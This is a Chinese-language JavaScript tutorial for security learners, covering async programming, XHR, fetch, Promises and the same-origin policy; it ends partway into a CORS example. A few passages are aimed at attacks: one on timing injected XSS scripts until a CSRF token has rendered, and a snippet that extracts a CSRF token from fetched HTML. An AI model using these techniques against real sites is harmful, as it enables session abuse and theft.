# JavaScript

> 浏览器里唯一能跑的语言，近几年通过 Node.js 也占领了服务端。前端（React/Vue）、后端（Express/Nest）、移动端（React Native）、桌面端（Electron）通吃。安全领域：XSS 攻击的核心语言、npm 供应链攻击的重灾区。

---

## 一眼认出这是 JavaScript

```javascript
// 注释：// 或 /* */
// 花括号 + 分号，长得像 C/Java 但不需要声明类型

// 变量声明（三种方式，行为不同）
var name = "Alice";        // 老式，函数作用域，不推荐
let age = 25;              // 块作用域，可变（推荐日常使用）
const PI = 3.14;           // 块作用域，不可变（推荐优先用）

// 函数：多种写法
function greet(name) {              // 老式函数声明
    return "Hello, " + name;
}

const greet = (name) => {           // 箭头函数（ES6+，更常见）
    return `Hello, ${name}`;        // 模板字符串用反引号 |
};

const greet = name => `Hello, ${name}`;  // 单行可省略 return

// 对象（和 JSON 很像但不是一回事）
const user = {
    name: "Alice",
    age: 25,
    greet() {                        // 方法简写
        console.log(`Hi, I'm ${this.name}`);
    }
};

// 数组和常用操作
const nums = [1, 2, 3, 4];
nums.map(n => n * 2);               // [2, 4, 6, 8]
nums.filter(n => n > 2);            // [3, 4]
nums.find(n => n === 3);            // 3
```

**一眼识别 JS 的关键特征：**
- `let` / `const` 声明变量（现代写法）
- 箭头函数 `=>` 
- `console.log()` 打印
- 模板字符串用反引号 `` ` ``

---

## 常用场景

| 场景 | 典型框架/工具 |
|------|-------------|
| 前端 UI | React, Vue, Angular, Svelte |
| 服务端 | Node.js + Express/Nest/Fastify |
| 全栈框架 | Next.js, Nuxt, Remix |
| 桌面应用 | Electron（VSCode、Obsidian 都是用 Electron 写的） |
| 移动应用 | React Native |
| 构建工具 | npm, yarn, webpack, vite, eslint |

---

## 关键概念

### 浏览器 vs Node.js

JavaScript 有两个截然不同的运行环境：

| | 浏览器 | Node.js |
|---|--------|---------|
| 全局对象 | `window` | `global` |
| DOM 操作 | `document.querySelector()` | 没有 DOM |
| 文件系统 | 不能访问（安全限制） | `fs.readFileSync()` |
| 模块化 | ES Modules（`import`/`export`） | CommonJS（`require`/`module.exports`）和 ESM 都支持 |
| 网络请求 | `fetch`（原生）、`XMLHttpRequest` | `fetch`（Node 18+）、`http` 模块 |

判断运行在哪：看到 `document.` 或 `window.` → 浏览器；看到 `require()` 或 `fs.` → Node.js。

### 异步模型

#### 为什么需要异步？—— 一个生活场景

想象你去咖啡店点一杯咖啡：

- **同步方式：** 你站在柜台前，盯着咖啡师做咖啡。咖啡做好之前你什么也不干，也不让后面的人点单。整个过程你被"卡"在柜台前。你自己被卡住了（阻塞），后面所有排队的客人也被你卡住了（整个程序卡死）。
- **异步方式：** 你点完单，拿一个取餐号（Promise），然后坐到座位上刷手机。咖啡做好了，叫号器响（回调函数），你去取咖啡。这期间你没被卡住，后面的人也能正常点单。

JavaScript 是单线程的——它只有一个咖啡师。如果咖啡师被一个客人卡住，整个店就瘫痪了。异步就是让所有耗时操作（煮咖啡）都不阻塞咖啡师接单（主线程），等操作完成了再通过叫号器（回调）通知客人。

JavaScript 是单线程的，同一时间只能做一件事。如果网络请求、文件读取等耗时操作采用同步方式，整个页面会卡死直到操作完成。异步机制让这些操作在后台进行，主线程继续响应用户交互，等操作完成后通过回调通知主线程处理结果。

#### 核心概念层

##### 同步 vs 异步

| 对比维度 | 同步（Synchronous） | 异步（Asynchronous） |
|---------|-------------------|---------------------|
| 执行方式 | 按顺序执行，前一个完成才能执行下一个 | 发起请求后立即返回，不等结果，结果回来了再处理 |
| 是否阻塞 | 会阻塞（代码卡在那一行等待结果） | 不阻塞（代码继续往下执行） |
| 用户体验 | 页面卡顿、无法点击、滚动不了 | 页面流畅，操作不受影响 |
| 代码直观性 | 直观，从上到下按顺序读就行 | 需要理解回调/Promise，不直观但更强大 |
| 适用场景 | 简单脚本、不涉及 I/O 的操作 | 网络请求、文件读取、定时器、事件监听 |

**同步代码的执行过程（逐行追踪）：**

```javascript
console.log('第1步：开始执行');          // 立刻输出
var data = getDataFromServer_Sync();    // 卡在这里等待服务器返回数据
                                        // 假设等了2秒...
                                        // 这2秒内页面完全卡死，用户点什么都没反应
console.log('第2步：数据是', data);      // 数据到了才执行这一行
console.log('第3步：继续执行');          // 全部完成后才执行
// 输出顺序: 第1步 -> (卡2秒) -> 第2步 -> 第3步
```

**异步代码的执行过程（逐行追踪）：**

```javascript
console.log('第1步：开始执行');                   // 立刻输出
var promise = getDataFromServer_Async();          // 发起请求，立刻拿到一个Promise对象
                                                  // 不等待！立刻继续往下执行
console.log('第2步：请求已发送，继续往下走');       // 立刻输出
promise.then(function(data) {                     // 注册回调：数据到了就执行这个函数
    console.log('第4步：数据是', data);            // 2秒后数据到达时才执行
});
console.log('第3步：注册完回调，主代码走完了');     // 立刻输出
// 输出顺序: 第1步 -> 第2步 -> 第3步 -> (等2秒) -> 第4步
```

关键观察：异步版本中，第3步先于第4步输出。这就是"非阻塞"——代码不等待网络请求，直接往下走，结果回来了再回头处理。

##### 阻塞 vs 非阻塞

这两个概念描述的是代码是否会"卡住"后续执行：

```javascript
// ===== 阻塞示例 =====
// readFileSync 中的 "Sync" 就是 Synchronous（同步）的缩写
// 看到函数名里有 Sync，就知道它会阻塞
console.log('开始读文件...');
var data = readFileSync('very-large-file.txt');  // 文件可能很大，读5秒
                                                  // 这5秒内JS引擎完全卡住
                                                  // 无法响应点击、无法滚动、页面"假死"
console.log('文件内容长度:', data.length);         // 5秒后才执行
console.log('读取完成，继续其他工作');

// ===== 非阻塞示例 =====
console.log('开始读文件...');
readFile('very-large-file.txt', function(err, data) {  // 发起读取，立刻返回
    // 这个回调函数暂时不会执行——它被"寄存"在事件循环中
    // 等文件读完了才会被调用
    console.log('文件内容长度:', data.length);          // 5秒后执行
});
console.log('读取请求已发送，主代码继续！');              // 立刻输出
console.log('可以继续处理其他事情，比如响应点击事件');     // 立刻输出

// 输出顺序:
// 开始读文件...
// 读取请求已发送，主代码继续！
// 可以继续处理其他事情，比如响应点击事件
// (约5秒后) 文件内容长度: 123456
```

**为什么要区分阻塞和非阻塞？**

JavaScript 运行在浏览器的"主线程"上。这个主线程同时也负责渲染页面、响应鼠标点击、处理键盘输入。如果主线程被阻塞了：

1. 页面停止渲染——用户看到的是"卡住"的界面
2. 按钮点了没反应——事件处理也被阻塞了
3. 超过一定时间，浏览器会弹出"页面无响应"的提示

所以任何可能耗时的操作（网络请求、文件读取、大量计算）都应该用非阻塞方式处理。

##### 回调函数（Callback）

回调函数是异步编程最基础的机制。它的思想很简单："我把一个函数给你，你做完了叫我"。

```javascript
// 第一步：定义一个"做完了要被调用的函数"，它就是回调
function 数据到了请执行(data) {
    console.log('收到数据了！内容是:', data);
    // 在这里处理数据...
}

// 第二步：发起异步操作时，把回调函数作为参数传进去
fetchDataFromServer('https://api.example.com/users', 数据到了请执行);
//                                               ↑
//                                    这就是"回调函数"——把函数当参数传

// 上面的代码等同于（更常见的写法是用匿名函数直接写在参数位置）：
fetchDataFromServer('https://api.example.com/users', function(data) {
    console.log('收到数据了！内容是:', data);
});
// 这种直接在参数位置写的 function 叫"匿名回调函数"
```

**回调函数的本质：** JavaScript 中函数是"一等公民"——函数可以赋值给变量、可以作为参数传给另一个函数、可以作为返回值从函数中返回。回调函数就是"把函数作为参数传递"这一特性的直接应用。

**回调函数的执行时机（重要！）：**

```javascript
console.log('A: 准备获取数据');

fetchData(function(result) {           // fetchData 内部会发起网络请求
    console.log('C: 数据到了！', result); // 这一行不是立刻执行的！
});                                      // 它被"寄存"了，等数据到了才执行

console.log('B: fetchData 已调用，但回调还没执行');

// 输出顺序: A -> B -> (等待网络请求...) -> C
// 注意 C 在 B 之后输出！这就是"异步"——代码不按书写顺序执行
```

初学者最常见的困惑就是以为 C 会在 B 之前输出（因为写在前面），但实际上异步回调被"推迟"执行了。

##### 事件循环（Event Loop）

事件循环是 JavaScript 实现异步的底层机制。理解它才能理解为什么 `setTimeout(fn, 0)` 不是立刻执行。

**三大组件：**

| 组件 | 英文名 | 作用 | 生活类比 |
|------|--------|------|---------|
| 调用栈 | Call Stack | 执行同步代码的地方，一次只执行最上面的一行 | 咖啡师的双手——一次只能做一件事 |
| 任务队列 | Task Queue (Macro Queue) | 存放等待执行的回调（setTimeout、setInterval、事件回调等） | 排队等待的订单条 |
| 微任务队列 | Microtask Queue | 存放 Promise 的回调（`.then()`、`.catch()`），优先级高于任务队列 | VIP 插队通道 |

**事件循环的工作流程（逐步追踪）：**

```
步骤1: 检查调用栈是否为空
       ├── 不为空 → 执行调用栈中当前的代码
       └── 为空 → 进入步骤2

步骤2: 检查微任务队列是否有待处理任务
       ├── 有 → 取出一个微任务，放入调用栈执行，然后回到步骤1
       └── 没有 → 进入步骤3

步骤3: 检查任务队列是否有待处理任务
       ├── 有 → 取出一个任务，放入调用栈执行，然后回到步骤1
       └── 没有 → 等待新任务到来，然后回到步骤1
```

**用一个完整的例子跑一遍事件循环：**

```javascript
console.log('1: 同步代码');

setTimeout(function() {
    console.log('2: setTimeout 回调');
}, 0);  // 即使延迟为0，也不是立刻执行！

Promise.resolve().then(function() {
    console.log('3: Promise.then 回调');
});

console.log('4: 同步代码结束');

// 实际输出顺序: 1 -> 4 -> 3 -> 2
// 为什么？让我们一步步追踪：
```

**逐步追踪执行过程：**

```
[初始状态]
调用栈: (空)
任务队列: (空)
微任务队列: (空)

[第1步] 执行 console.log('1: 同步代码')
调用栈: [console.log('1')]
输出: 1
调用栈变为空

[第2步] 执行 setTimeout(...)
调用栈: [setTimeout(fn, 0)]
浏览器创建一个定时器，0ms后将 fn 放入任务队列
调用栈变为空

[第3步] 执行 Promise.resolve().then(fn)
调用栈: [Promise.resolve(), .then(fn)]
fn 被放入微任务队列（注意：是微任务队列！）
调用栈变为空

[第4步] 执行 console.log('4: 同步代码结束')
调用栈: [console.log('4')]
输出: 4
调用栈变为空

--- 同步代码全部执行完毕，调用栈为空 ---

[第5步] 事件循环检查微任务队列
微任务队列: [Promise.then回调]
任务队列: [setTimeout回调]  (可能还没到0ms，但就算到了也是微任务优先！)

先取微任务！执行 Promise.then 回调
调用栈: [console.log('3')]
输出: 3
调用栈变为空

[第6步] 再次检查微任务队列
微任务队列: (空)
任务队列: [setTimeout回调]

取任务队列中的 setTimeout 回调
调用栈: [console.log('2')]
输出: 2
调用栈变为空

最终输出: 1 -> 4 -> 3 -> 2
```

**关键结论：**

1. 同步代码一定最先执行完（调用栈先清空）
2. 微任务（Promise.then）优先于宏任务（setTimeout）执行
3. 即使是 `setTimeout(fn, 0)`，fn 也不会立刻执行——它要排队等调用栈清空

**这个知识对 XSS 攻击很重要：** 当你注入的脚本需要在页面加载完成、CSRF token 已渲染后再执行时，需要理解事件循环来决定是用 `setTimeout`（宏任务）还是 `Promise.then`（微任务）来延迟执行。

#### 实现技术层

##### XMLHttpRequest（XHR）—— 传统方式

XHR 是浏览器提供的第一个异步 HTTP 请求 API，从 IE5 时代就存在。虽然现在有了更现代的替代方案，但在 CTF 和漏洞实验中仍然大量使用，因为它不依赖任何新特性、兼容性最好。

**基本结构和逐行解析：**

```javascript
// 第1步：创建请求对象
// new XMLHttpRequest() 创建一个空的请求对象，此时还没设置任何参数
var xhr = new XMLHttpRequest();

// 第2步：注册事件监听器
// onreadystatechange 会在请求状态每次变化时被调用
// 从创建到完成，一共会触发多次（readyState 从 0 变到 4）
xhr.onreadystatechange = function() {
    // readyState === 4 表示"完成"——服务器响应已全部接收
    // status === 200 表示"成功"——服务器返回了正常的 HTTP 200
    if (xhr.readyState === 4 && xhr.status === 200) {
        // responseText 是服务器返回的响应体（字符串格式）
        console.log(xhr.responseText);
    }
};

// 第3步：配置请求
// open() 的三个参数：
//   'GET'    - HTTP 方法（GET/POST/PUT/DELETE 等）
//   '/api'   - 请求的 URL 路径
//   true     - 是否异步（true=异步，false=同步）
//              几乎永远用 true，false 会导致页面卡死
xhr.open('GET', '/api', true);

// 第4步：发送请求
// send() 的参数是请求体（Request Body）
// GET 请求没有请求体，所以传空或不传
// POST 请求需要在这里传入表单数据或 JSON 字符串
xhr.send();
```

**`readyState` 的五个状态（详细解释）：**

| readyState | 常量名 | 含义 | 发生了什么 |
|-----------|--------|------|-----------|
| 0 | UNSENT | 未发送 | `new XMLHttpRequest()` 创建了对象，但 `open()` 还没调用。对象刚出生，什么都不知道 |
| 1 | OPENED | 已打开 | `open()` 已调用，请求目标已确定。相当于信封上写好了地址 |
| 2 | HEADERS_RECEIVED | 已收到响应头 | `send()` 已调用，服务器返回了 HTTP 状态码和响应头。信封的回执到了，但信的内容还在路上 |
| 3 | LOADING | 加载中 | 响应体正在下载中。`responseText` 中已有部分数据。信的内容正在一页一页传过来 |
| 4 | DONE | 完成 | 响应体全部下载完毕。整个请求-响应周期结束。信的内容全部到了 |

```javascript
// 完整的 readyState 追踪示例
var xhr = new XMLHttpRequest();
console.log('状态0:', xhr.readyState);  // 0 - UNSENT

xhr.onreadystatechange = function() {
    console.log('状态变化:', xhr.readyState);
    // 会依次输出: 1(open后) -> 2 -> 3 -> 4
};

xhr.open('GET', '/api', true);
console.log('状态1:', xhr.readyState);  // 1 - OPENED

xhr.send();
// 之后 onreadystatechange 会依次被调用，状态从 2 变到 4
```

**XHR 的事件体系（不止 onreadystatechange）：**

```javascript
var xhr = new XMLHttpRequest();

// 方式一：使用 onreadystatechange（最传统，兼容性最好，CTF中常用）
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log('请求成功:', xhr.responseText);
    }
};

// 方式二：使用 onload / onerror（更清晰，语义更明确）
xhr.onload = function() {
    // onload 只在请求成功完成时触发（相当于 readyState===4 且 status 为 2xx）
    // 不用再手动检查 readyState 和 status
    console.log('请求成功:', xhr.responseText);
};
xhr.onerror = function() {
    // 网络层面的错误（DNS解析失败、连接被拒绝等）
    // 注意：HTTP 404、500 不算网络错误，它们仍然会触发 onload
    console.log('网络请求失败');
};
xhr.onprogress = function(event) {
    // 下载进度，event.loaded 是已下载字节数，event.total 是总字节数
    // 可以用于显示进度条
    var percent = (event.loaded / event.total * 100).toFixed(0);
    console.log('下载进度:', percent + '%');
};
xhr.timeout = 5000;  // 设置超时时间（毫秒），超过这个时间自动取消请求
xhr.ontimeout = function() {
    console.log('请求超时了！');
};

xhr.open('GET', '/api', true);
xhr.send();
```

**为什么不能只检查 `onload` 而要检查 `readyState` 和 `status`？**

```javascript
// 这段代码有隐患：
xhr.onload = function() {
    // onload 在响应完成时触发，不管 HTTP 状态码是多少
    // 如果服务器返回 500 Internal Server Error，onload 仍然触发
    // 但 responseText 里可能是错误页面而非你期望的数据
    console.log(xhr.responseText);  // 可能是错误信息
};

// 更安全的写法——手动检查状态码：
xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
        console.log('成功:', xhr.responseText);
    } else if (xhr.status === 404) {
        console.log('资源不存在');
    } else {
        console.log('服务器错误，状态码:', xhr.status);
    }
};
```

**GET 和 POST 请求的完整写法：**

```javascript
// ===== GET 请求 =====
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    console.log(xhr.responseText);
};
xhr.open('GET', '/api/users?id=123&name=test', true);
// GET 请求：数据通过 URL 的查询字符串传递
// send() 不传请求体（或传 null）
xhr.send();

// ===== POST 请求（表单格式）=====
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    console.log(xhr.responseText);
};
xhr.open('POST', '/api/users', true);
// 告诉服务器：请求体的格式是"表单编码"（和 HTML form 提交一样）
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
// POST 请求：数据通过 send() 的请求体传递
xhr.send('name=test&email=test@example.com');

// ===== POST 请求（JSON 格式）=====
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    console.log(xhr.responseText);
};
xhr.open('POST', '/api/users', true);
// 告诉服务器：请求体的格式是 JSON
xhr.setRequestHeader('Content-Type', 'application/json');
// 把 JavaScript 对象转为 JSON 字符串作为请求体
xhr.send(JSON.stringify({ name: 'test', email: 'test@example.com' }));
```

##### Fetch API —— 现代方式

Fetch 是 ES6（2015年）引入的现代 HTTP 请求 API，基于 Promise。比 XHR 语法更简洁，但也有一些"反直觉"的行为需要特别注意。

**最简单的 Fetch 请求（逐行解析）：**

```javascript
// fetch() 函数接收两个参数：URL 和可选的配置对象
// 它立即返回一个 Promise 对象（不会阻塞）
fetch('/api/data')
    // .then() 注册回调：当服务器返回响应头时触发
    // response 是一个 Response 对象，此时响应体可能还没完全下载
    .then(function(response) {
        // !!! 重要：即使 HTTP 状态码是 404 或 500，fetch 也不会报错
        // fetch 只在"网络请求发不出去"时才 reject（比如断网、DNS解析失败）
        // 所以需要手动检查 response.ok
        if (!response.ok) {
            throw new Error('HTTP错误！状态码: ' + response.status);
        }
        // response.json() 解析响应体为 JSON 对象
        // 注意：.json() 本身也返回一个 Promise！因为解析大JSON可能耗时
        return response.json();
    })
    // 第二个 .then()：拿到解析后的 JSON 数据
    .then(function(data) {
        console.log('解析后的数据:', data);
        console.log('用户名:', data.name);
    })
    // .catch()：捕获前面任何一个步骤抛出的错误
    .catch(function(error) {
        console.error('请求或解析过程中出错了:', error.message);
    });
```

**Fetch 配置对象详解：**

```javascript
fetch('/api/users', {
    method: 'POST',                           // HTTP 方法，默认是 GET
    headers: {                                // 自定义请求头
        'Content-Type': 'application/json',   // 告诉服务器请求体是 JSON
        'X-Custom-Header': 'some-value'       // 自定义头（服务端可读取）
    },
    body: JSON.stringify({                    // 请求体，必须是字符串
        name: 'test',
        email: 'test@example.com'
    }),
    // 其他常用配置：
    mode: 'cors',              // cors(默认跨域) | no-cors | same-origin(仅同域)
    credentials: 'same-origin', // omit(不发Cookie) | same-origin(同域才发) | include(总是发)
    redirect: 'follow',         // follow(跟随重定向) | error | manual
    cache: 'default'            // default | no-store | reload | no-cache | force-cache
});
```

**Fetch 的一个坑（重要！）：HTTP 错误码不会触发 catch**

```javascript
// 这个请求返回了 404 Not Found，但 catch 不会执行！
fetch('/api/non-existent')
    .then(function(response) {
        console.log('这里会执行！虽然页面是404');
        // response.ok 是 false（状态码不在 200-299 之间）
        // response.status 是 404
        // 但没有自动进 catch
    })
    .catch(function(error) {
        console.log('这里不会执行！因为网络请求本身是"成功"的');
        // catch 只捕获真正的网络错误（断网、DNS 失败、CORS 阻止等）
    });

// 正确的错误处理方式——手动检查：
fetch('/api/non-existent')
    .then(function(response) {
        if (!response.ok) {
            // 手动抛出错误，让后面的 catch 捕获
            throw new Error('服务器返回了错误状态码: ' + response.status);
        }
        return response.json();
    })
    .then(function(data) {
        console.log('数据:', data);
    })
    .catch(function(error) {
        // 现在不管是网络错误还是我们手动抛出的错误都会到这里
        console.log('出错了:', error.message);
    });
```

**Response 对象的常用方法：**

```javascript
fetch('/api/data')
    .then(function(response) {
        // 根据返回内容的格式选择合适的解析方法：
        // response.json()   -> 解析 JSON，返回 JavaScript 对象
        // response.text()   -> 解析为纯文本字符串
        // response.blob()   -> 解析为二进制数据（图片、文件等）
        // response.arrayBuffer() -> 解析为原始二进制缓冲区
        // response.formData() -> 解析为 FormData 对象
        
        // 这些方法都返回 Promise！所以需要继续 .then()
        return response.text();
    })
    .then(function(text) {
        console.log('响应内容(纯文本):', text);
        // 如果是 HTML 页面，可以从中提取信息
        var csrfToken = text.match(/name="csrf" value="([^"]+)"/);
        if (csrfToken) {
            console.log('提取到的CSRF令牌:', csrfToken[1]);
        }
    });
```

##### async/await —— 最现代方式

async/await 是 ES2017 引入的语法糖。它让异步代码看起来像同步代码，大幅提高了可读性。但底层仍然是 Promise。

**基础用法（对比 Promise 写法）：**

```javascript
// ===== Promise 写法（链式调用）=====
function getData_Promise() {
    fetch('/api/data')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            console.log(data);
        })
        .catch(function(error) {
            console.error(error);
        });
}

// ===== async/await 写法（看起来像同步）=====
async function getData_AsyncAwait() {
    try {
        // await 关键字：等这个 Promise 完成，然后把结果赋给左边变量
        // 代码"暂停"在这一行，但主线程不会被阻塞！
        var response = await fetch('/api/data');
        // ↑ 上面这行等同于 fetch(...).then(response => ...)
        // 只是写法上像是同步的"等结果"
        
        var data = await response.json();
        // ↑ 同样，等 JSON 解析完成
        
        console.log(data);
    } catch (error) {
        // try/catch 可以直接捕获 await 表达式中抛出的任何错误
        console.error(error);
    }
}

getData_AsyncAwait();  // 调用 async 函数，它返回 Promise
```

**async/await 的关键规则：**

```javascript
// 规则1：async 函数一定返回 Promise
async function sayHello() {
    return 'Hello';  // 虽然写的是 return 字符串
}
var result = sayHello();
console.log(result);  // Promise { <fulfilled>: "Hello" }
// JavaScript 自动把 return 的值包装成 Promise

// 规则2：await 只能在 async 函数内部使用
// 以下代码会报错（在模块顶层可以，但在普通脚本顶层不行）：
// var data = await fetch('/api');  // SyntaxError!

// 正确做法：包在 async 函数里
async function main() {
    var data = await fetch('/api');
}
main();

// 规则3：await 后面的代码会等 Promise 完成
async function example() {
    console.log('1');
    var result = await fetch('/api');  // 在这里"等"fetch完成
    // ↑ 等同于 .then() 回调里面的代码
    console.log('2');  // fetch 完成后才执行
    console.log('3');
}
// 输出: 1 -> (等fetch完成) -> 2 -> 3
// 看起来像同步，但主线程没被阻塞！
```

**async/await 怎么做到"看起来像同步但不阻塞"？**

```javascript
// 这段代码：
async function demo() {
    console.log('A');
    var data = await fetch('/api');
    console.log('B:', data);
}
console.log('C');
demo();
console.log('D');

// 输出顺序: C -> A -> D -> (fetch完成) -> B
// 
// 执行过程逐行追踪：
// 1. 执行 console.log('C') -> 输出 C
// 2. 调用 demo()，进入 async 函数
// 3. 执行 console.log('A') -> 输出 A
// 4. 遇到 await fetch('/api')：
//    - 发起 fetch 请求（不阻塞）
//    - demo() 函数在此"暂停"，把控制权交还给主线程
//    - demo() 返回一个 Promise（此时还是 pending 状态）
// 5. 主线程继续：执行 console.log('D') -> 输出 D
// 6. 主线程空闲，等待网络请求完成...
// 7. fetch 完成，demo() 函数从暂停处"恢复"执行
// 8. 执行 console.log('B:', data) -> 输出 B
```

**并行执行多个请求：**

```javascript
// ===== 错误写法：串行执行，慢 =====
async function getUsers_Serial() {
    // 每个 await 都等前一个完成才开始
    var user1 = await fetch('/api/user/1');   // 等这个完成...
    var user2 = await fetch('/api/user/2');   // 才开始这个...
    var user3 = await fetch('/api/user/3');   // 才开始这个...
    // 总耗时 = 三次请求时间之和（比如 300ms + 300ms + 300ms = 900ms）
}

// ===== 正确写法：并行执行，快 =====
async function getUsers_Parallel() {
    // 三个请求同时发出，不互相等待
    var promise1 = fetch('/api/user/1');  // 立即发起，拿到 Promise
    var promise2 = fetch('/api/user/2');  // 立即发起
    var promise3 = fetch('/api/user/3');  // 立即发起
    // 三个请求已经在路上了！
    
    // Promise.all() 等所有请求都完成
    var responses = await Promise.all([promise1, promise2, promise3]);
    // 总耗时 = 三次请求中最慢的那个（比如最慢的 350ms）
}
```

#### 周边概念层

##### Promise —— 异步编程的核心基石

Promise 是 JavaScript 中表示"将来某个时刻会有结果"的对象。在 Promise 出现之前，异步代码全靠回调函数嵌套，导致"回调地狱"。Promise 提供了一种更优雅的方式来组织异步代码。

**Promise 就像外卖订单号：**

你点了一份外卖，拿到一个订单号（Promise）。这个订单号本身不是饭，但它代表"饭将来会到"：
- 饭正在做 → `pending`（进行中）
- 饭送到了 → `fulfilled`（已完成）
- 订单取消了 → `rejected`（已失败）

你可以在拿到订单号的那一刻就决定"饭到了之后要做什么"——`.then(饭到了 => 开吃)`。这就是注册回调，不需要等饭到了才想。

**Promise 的三种状态（不可逆）：**

```javascript
// 状态转换规则：
// pending -> fulfilled（成功）  或  pending -> rejected（失败）
// 一旦状态改变，就永久固定，不能再次改变

// 创建一个 Promise
var promise = new Promise(function(resolve, reject) {
    // 这个函数叫 "executor"（执行器）
    // 它在你 new Promise 时立即同步执行
    
    // resolve: 一个函数，调用它表示"成功了"
    // reject: 一个函数，调用它表示"失败了"
    // 两者只能调用一个，且只能调用一次
    
    setTimeout(function() {
        var success = Math.random() > 0.5;
        if (success) {
            resolve('数据到了！');    // Promise 状态: pending -> fulfilled
        } else {
            reject('网络出错了！');   // Promise 状态: pending -> rejected
        }
    }, 1000);
});

// 消费 Promise 的结果
promise
    .then(function(result) {
        // resolve() 被调用时执行这里
        console.log('成功:', result);
    })
    .catch(function(error) {
        // reject() 被调用时执行这里
        console.log('失败:', error);
    })
    .finally(function() {
        // 无论成功还是失败都执行（做清理工作）
        console.log('请求结束（无论成败）');
    });
```

**Promise 链式调用原理（.then() 总是返回新 Promise）：**

```javascript
fetch('/api/user/1')
    .then(function(response) {          // .then() 返回一个新的 Promise A
        return response.json();          // 如果 return 一个 Promise，则 Promise A 采用它的结果
    })
    .then(function(user) {              // 等 Promise A 完成，拿到解析后的数据
        console.log('用户:', user.name);
        return fetch('/api/posts?userId=' + user.id);  // 又返回一个新 Promise
    })
    .then(function(response) {          // 等上面的 fetch 完成
        return response.json();
    })
    .then(function(posts) {
        console.log('文章数量:', posts.length);
    })
    .catch(function(error) {
        // 链中任意一个环节出错，都会被这个 catch 捕获
        console.log('某个环节出错了:', error);
    });
```

**Promise 的常用静态方法：**

```javascript
// Promise.all() —— 全部完成才算完成
// 场景：同时请求多个独立数据，等全部到齐再处理
Promise.all([
    fetch('/api/user'),
    fetch('/api/posts'),
    fetch('/api/comments')
]).then(function(responses) {
    // responses 是一个数组，包含三个请求的 Response 对象
    // 顺序和传入的 Promise 数组顺序一致
    console.log('三个请求都完成了！');
}).catch(function(error) {
    // 只要其中一个失败，整个 Promise.all 就失败
    console.log('至少一个请求失败了:', error);
});

// Promise.race() —— 谁先完成用谁的结果
// 场景：设置超时（如果请求太慢就用备用数据）
var request = fetch('/api/data');
var timeout = new Promise(function(resolve, reject) {
    setTimeout(function() {
        reject(new Error('请求超时'));
    }, 5000);
});
Promise.race([request, timeout])
    .then(function(response) {
        console.log('请求在5秒内完成了');
    })
    .catch(function(error) {
        console.log('请求超时或失败了');
    });

// Promise.allSettled() —— 等全部"有结果"（不管成败）
// 场景：发送一批请求，想知道每个的结果但不希望一个失败就全停
Promise.allSettled([
    fetch('/api/user/1'),
    fetch('/api/user/2'),   // 假设这个返回 404
    fetch('/api/user/3')
]).then(function(results) {
    // results 是数组，每个元素是 { status: 'fulfilled', value: ... }
    // 或 { status: 'rejected', reason: ... }
    results.forEach(function(result, index) {
        if (result.status === 'fulfilled') {
            console.log('用户' + (index+1) + ': 成功');
        } else {
            console.log('用户' + (index+1) + ': 失败 -', result.reason);
        }
    });
});
```

##### 回调地狱（Callback Hell）

当多个异步操作需要按顺序执行时，如果用传统回调函数写法，代码会形成深层嵌套的"金字塔"形状，难以阅读和维护。

**回调地狱的产生原因：**

```javascript
// 需求：获取用户信息 -> 获取用户的文章 -> 获取第一篇文章的评论 -> 获取评论者信息
// 这四个操作必须按顺序执行（后一步依赖前一步的结果）

// ===== 回调地狱写法（不推荐）=====
getUser('userId', function(user) {                      // 第1层缩进
    console.log('用户:', user.name);
    getPosts(user.id, function(posts) {                  // 第2层缩进
        console.log('文章数:', posts.length);
        getComments(posts[0].id, function(comments) {    // 第3层缩进
            console.log('评论数:', comments.length);
            getUser(comments[0].author, function(author) { // 第4层缩进
                console.log('评论者:', author.name);
                // 如果再嵌套下去...第5层、第6层...
                // 代码越来越向右"飘"，越来越难读
            });
        });
    });
});
// 问题：缩进越来越深、错误处理困难、代码像"倒金字塔"

// ===== Promise 写法（推荐）=====
getUser('userId')
    .then(function(user) {
        console.log('用户:', user.name);
        return getPosts(user.id);       // 返回新 Promise
    })
    .then(function(posts) {
        console.log('文章数:', posts.length);
        return getComments(posts[0].id); // 返回新 Promise
    })
    .then(function(comments) {
        console.log('评论数:', comments.length);
        return getUser(comments[0].author);
    })
    .then(function(author) {
        console.log('评论者:', author.name);
    })
    .catch(function(error) {
        // 一处错误处理，覆盖所有步骤
        console.log('某个步骤出错了:', error.message);
    });
// 优势：缩进始终一层、错误处理集中在一处、每个步骤清晰独立

// ===== async/await 写法（最推荐）=====
async function getCommentAuthor() {
    try {
        var user = await getUser('userId');
        console.log('用户:', user.name);
        
        var posts = await getPosts(user.id);
        console.log('文章数:', posts.length);
        
        var comments = await getComments(posts[0].id);
        console.log('评论数:', comments.length);
        
        var author = await getUser(comments[0].author);
        console.log('评论者:', author.name);
    } catch (error) {
        console.log('某个步骤出错了:', error.message);
    }
}
// 优势：看起来像同步代码，从上到下一行行读，最符合直觉
```

##### 同源策略和 CORS

这是异步请求最重要的安全机制，也是理解 XSS 攻击范围的关键。

**什么是"源"（Origin）？**

```
URL: https://www.example.com:443/api/users?page=1
      ~~~~~~ ~~~~~~~~~~~~~~~ ~~~ 
      协议    主机（域名）     端口

"源" = 协议 + 主机 + 端口 的组合
只有这三者完全一样，才算"同源"
```

| 对比 | 是否同源？ | 原因 |
|------|----------|------|
| `https://example.com` vs `https://example.com/api` | 同源 | 只有路径不同，协议+主机+端口相同 |
| `https://example.com` vs `http://example.com` | 不同源 | 协议不同（https vs http） |
| `https://example.com` vs `https://sub.example.com` | 不同源 | 主机不同（子域名也算不同） |
| `https://example.com:443` vs `https://example.com:8443` | 不同源 | 端口不同 |

**同源策略（Same-Origin Policy）的核心规则：**

同源策略是浏览器最基础的安全机制。它规定：
- 一个源下的 JavaScript 可以随意读取**同源**下的数据
- 一个源下的 JavaScript **不能**读取**不同源**下的数据

这就是为什么你访问 `evil.com` 的网页时，它无法用 JavaScript 读取 `bank.com` 页面里你的账户余额——虽然你的浏览器里确实同时登录了 `bank.com`。

**CORS（Cross-Origin Resource Sharing，跨域资源共享）：**

CORS 是服务器说"我允许其他源的网站来访问我"的机制。当浏览器检测到一个跨域请求时：

```javascript
// 场景：从 https://mysite.com 的页面发请求到 https://api.other.com
fetch('https://api.other.com/data')
